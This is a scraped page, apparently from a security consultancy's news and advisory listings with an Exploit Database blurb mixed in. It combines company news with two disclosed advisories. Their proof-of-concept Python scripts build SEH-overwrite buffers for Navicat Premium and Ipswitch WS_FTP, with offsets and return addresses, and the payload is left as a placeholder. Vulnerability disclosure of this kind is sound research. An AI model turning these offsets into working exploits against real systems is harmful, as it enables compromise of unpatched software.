## [Scottish SMEs and Third Sector Organisations Eligible for CE and CE Plus Vouchers](https://www.7elements.co.uk/news/scottish-smes-third-sector-organisations-eligible-ce-ce-plus-vouchers/)

November 7, 2018 by [Kevin McGuigan](https://www.7elements.co.uk/author/kevin/)

In June of this year, the Scottish Government set out their ongoing commitment to developing the Safe, Secure and Prosperous: A Cyber Resilience Strategy for Scotland. As part of this, they have made £500,000 available under the National Cyber Security Programme for a voucher scheme to support small and medium-sized private and third sector organisations in Scotland. Funding is to enable those organisations to achieve the National Cyber Security Centre (NCSC) endorsed Cyber Essentials or Cyber Essentials Plus certificate.

Organisations can apply for the grant funding online and if approved will be eligible to access the money once they have achieved the Cyber Essentials accreditation. As an independent technical information assurance consultancy, 7 Elements is well placed to support your organisation through the process of gaining Cyber Essentials certification. All of our staff are highly technical and therefore our Cyber Essentials assessors are well qualified to assist you through the process. More information on the Cyber Essentials process can be found here: <https://www.7elements.co.uk/services/cyber-essentials/>

As of today (7th November 2018), the scheme is live and you can apply for your voucher of up to £1000 to achieve Cyber Essentials certification. The scheme will run for 12 months or until the vouchers have been exhausted.

Scotland based small and medium-sized private sector organisations can apply via a portal on the Scottish Enterprise website below:

<https://www.scottish-enterprise.com/>

Third sector organisations can apply via a portal on the Scottish Council Voluntary Organisations (SCVO) website below:

## [Best Customer Experience Award Nomination 2018](https://www.7elements.co.uk/resources/blog/best-customer-experience-award-nomination-2018/)

October 9, 2018 by [Kevin McGuigan](https://www.7elements.co.uk/author/kevin/)

We are thrilled to have been nominated for the ‘Best Customer Experience’ award at the 2018 Scottish Cyber Awards!

The Scottish Cyber Awards are back for their third year, and we are delighted to have been nominated for the ‘Best Customer Experience’ award. This nomination means even more to us because all recommendations are from end-users that had directly utilised the services of a Scottish based cyber security organisation, which is a massive honour. We are delighted to be in such good company with Quorum Cyber and Seric Systems.

> The customer experience award aims to credit organisations who are dedicated to providing outstanding service. Companies who have gone over and above what is expected to offer excellent service and act as a standard for organisations across the industry to aim for over the coming year (SBRC 2018).

> David and his team are customer experience wizards – whenever I need their services, they’re there. Dependable, adaptive, clear and reliable. On all the engagements I’ve worked on with 7 Elements I’ve been impressed by David and his team’s responsiveness and capabilities. Genuine passion for the area rather than being sales driven. This goes a long way with me and I’ll keep going back to them on this basis. – 7 Elements Nomination

The winner of this award will be decided via public vote and we hope that we can rely on yours! Voting closes on the 30th October and you can place your votes here:

<https://www.scottishcyberawards.co.uk>

The winner will be announced at the awards dinner on the 28th November at the Sheraton Hotel.

## [ZoneFox Collaboration](https://www.7elements.co.uk/news/zonefox-collaboration/)

August 15, 2018 by [Kevin McGuigan](https://www.7elements.co.uk/author/kevin/)

We are excited to announce our recent partnership with [ZoneFox](https://www.zonefox.com/), to enhance our award winning Incident Response Service.

At 7 Elements we work with clients across the globe, providing expertise in technical information assurance. We use an event-driven approach to Incident Response encompassing five key stages: situational awareness; establishing response parameters; resource deployment; establishing compromise zone and incident classification; followed by incident containment and remediation.

To enhance our situational awareness capability we have partnered with ZoneFox and will be able to deploy the ZoneFox agent as part of our initial response activity.

The ZoneFox solution monitors user behaviour and data movement both on-and-off-network, alerting against malicious or anomalous behaviour. This is achieved through user and entity behaviour analytics (UEBA) and intelligent machine-learning technology that provides 360 visibility across the network and beyond.

Jamie Graves, CEO, ZoneFox said: “Through our work with clients it is becoming increasingly clear that the majority are now using the platform as a cornerstone of their Incident Response strategy. The data and evidence the platform delivers to the business makes it easy to pinpoint vulnerabilities and devise a remediation plan. We’re delighted to be working with 7 Elements and this is definitely an area of the business we will be looking to grow.”

## [Navicat Premium Oracle Connection Buffer Overflow (SEH overwrite) Vulnerability](https://www.7elements.co.uk/resources/technical-advisories/navicat-premium-oracle-connection-buffer-overflow-seh-overwrite/)

May 1, 2018 by [Kevin McGuigan](https://www.7elements.co.uk/author/kevin/)
### Advisory Information

**Title: Navicat Premium Oracle Connection Buffer Overflow (SEH overwrite)**

**Date Published: 01/05/2018**

### Advisory Summary

Inputting an excessively long string of characters into the ‘host’ field when creating a new Oracle connection causes the program to crash. A lack of address space layout randomisation (ASLR) enabled within the software allows an attacker to reliably hijack the execution flow of the application.

### Vendor

PremiumSoft CyberTech Ltd

### Affected Software

| **Product** | **Version** |
| --- | --- |
| NaviCat Premium | <= 12.0.26 |

### Description of Issue

A buffer overflow vulnerability was discovered in NaviCat Premium version 12.0.26. This vulnerability was found in the “New Connection” component of the application. Entering an excessively long string into the host field of a new Oracle connection will cause the program to crash. This crash, combined with a lack of ASLR enabled within the application, allows an attacker to overwrite the structured exception handler (SEH) and hijack execution flow of the application. This issue was tested on a 32-bit Windows 7 host.

###

### PoC

The following proof of concept python script will generate a text file with a string to overwrite SEH. Once the file is generated, copy the contents of navicatPOC.txt and paste into the host field of a new Oracle connection. Test the connection to trigger the crash

# Vendor notified on 04/04/2018. Patch issued on 25/04/2018.

# Generate file > Create new Oracle Connection > paste contents of "navicatPOC.txt" into host field and test connection to trigger overflow.
filename="navicatPOC.txt"
junk = "A" * 1502
#nseh = "\x4C\x4C\x77\x04"
#seh= "\x75\x2a\x01\x10"
nseh = "B" * 4
seh = "C" * 4
fill = "D" * 4000
buffer = junk + nseh + seh + fill
textfile = open(filename , 'w')
textfile.write(buffer)
textfile.close()
```

---

This will result an SEH overwrite, as demonstrated by the following screenshot:

![SEH Overwrite](https://www.7elements.co.uk/wp-content/uploads/2018/05/Screen-Shot-2018-05-01-at-11.01.58.png)

From here, we can replace SEH with POP POP RET instructions, located at 10012a75:

`seh= "\x75\x2a\x01\x10"`

And replace nSEH with the following code to jump to our payload:

`nseh = "\x4C\x4C\x77\x04"`

Which will land at the payload, represented in the proof of concept as the character ‘D’ (\x44).

## [CVE-2017-16513 – Ipswitch WS\_FTP Professional Local Buffer Overflow (SEH overwrite)](https://www.7elements.co.uk/resources/technical-advisories/ipswitch-ws_ftp-professional-local-buffer-overflow-seh-overwrite/)

November 2, 2017 by [Kevin McGuigan](https://www.7elements.co.uk/author/kevin/)
### Advisory Information

**Title: CVE-2017-16513 Ipswitch WS\_FTP Professional Local Buffer Overflow (SEH overwrite)**

**Date Published: 03/11/2017**

### Advisory Summary

The application accepts user input to perform a local search function. Inputting an excessively long string of characters causes the program to crash and for an attacker to gain control of the execution flow of the application. This issue also impacts the “backup location” field.

### Vendor

Ipswitch

### Affected Software

| **Product** | **Version** |
| --- | --- |
| Ipswitch WS\_FTP Professional | 12.6.03 |

### Description of Issue

A local buffer overflow vulnerability was discovered in Ipswitch WS\_FTP Professional version 12.6. This vulnerability was found in the “local search” component of the application. Entering a search string longer than 779 characters will cause the program to crash. It is possible to overwrite the structured exception handler (SEH) after an offset of 840 characters and hijack execution flow of the application. This issue also impacts the “backup location” field and was tested on a 32-bit Windows 7 host.

###

### PoC

The following proof of concept python script will generate a text file with a string to overwrite SEH. Once the file is generated, copy the contents of poc.txt and paste into the local search field to trigger the crash.

---

```

#!/usr/bin/python
#Title: Ipswitch WS_FTP Professional Local Buffer Overflow (SEH overwrite)
#Author: Kevin McGuigan
#Author Website: https://www.7elements.co.uk
#Vendor Website: https://www.ipswitch.com
#nSEH = "\x74\x08\x90\x90"
#SEH = "\x31\x2D\x91\x23"

buffer = "A" * 840
nSEH = "B" * 4
SEH = "C" * 4

f = open ("poc.txt", "w")
f.write(buffer + nSEH + SEH + "D" * 200)
f.close()
```

---

This will result trigger an SEH overwrite, as demonstrated by the following screenshot:

[![SEH Overwrite](https://www.7elements.co.uk/wp-content/uploads/2017/10/ipswitch.png)](https://www.7elements.co.uk/wp-content/uploads/2017/10/ipswitch.png)

From here, we can replace SEH with POP POP RET instructions, located at:

`23912D31`

And replace nSEH with the following code to jump to our payload:

`"\x74\x08\x90\x90"`

Which will land at the payload, represented in the proof of concept as the character ‘D’ (\x44).

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

# Welcome to 7 Elements

We are a CREST accredited, independent IT security testing company providing expertise in technical information assurance through security testing, incident response and consultancy.

Offering completely impartial advice, our highly experienced team is here to guide you through the process, tailoring our service to your exact requirements, offering you the best and most flexible engagement for your business.

### **If you have an ongoing cyber incident call our triage team on 0131 235 2901**

Our core service offerings cover the following areas:

 [## Security Testing

![](https://www.7elements.co.uk/wp-content/uploads/2020/04/logo_color_crest.png)

At 7 Elements our approach to security testing is based on manual penetration testing techniques and goes further than doing a simple vulnerability scan. This approach, combined with our technical knowledge, ensures a deeper level of assurance and delivers pragmatic and tailored advice that is specific to the environment under test, backed up by our CREST accreditation for penetration testing services.](services/security-testing/)
[## Incident Response

![](https://www.7elements.co.uk/wp-content/uploads/2015/01/fingerprint-350x150.jpg)

Based upon our extensive industry experience and hands on knowledge gained through the response to security incidents and the delivery of security testing, we have developed a unique Event Driven Approach to incident response that combines incident response with attack led knowledge. If you have an ongoing cyber incident call our triage team on 0131 235 2901](/services/incident-response/)

## Cyber Attack Simulation

[![](https://www.7elements.co.uk/wp-content/uploads/2018/11/attack_1-300x166.jpg)](https://www.7elements.co.uk/wp-content/uploads/2018/11/attack_1.jpg)

Cyber Attack Simulation (often referred to as

Red Teaming or ‘scenario based testing’)

brings together our security testing and

threat knowledge gained through extensive

[incident response](https://www.7elements.co.uk/services/incident-response/) experience to generate

complex [scenario based testing engagements](https://www.7elements.co.uk/services/security-testing/).

The scenario goes beyond identifying how an

attacker will gain access, and tests your own

organisation’s capability to detect and respond to

a breach in real time.
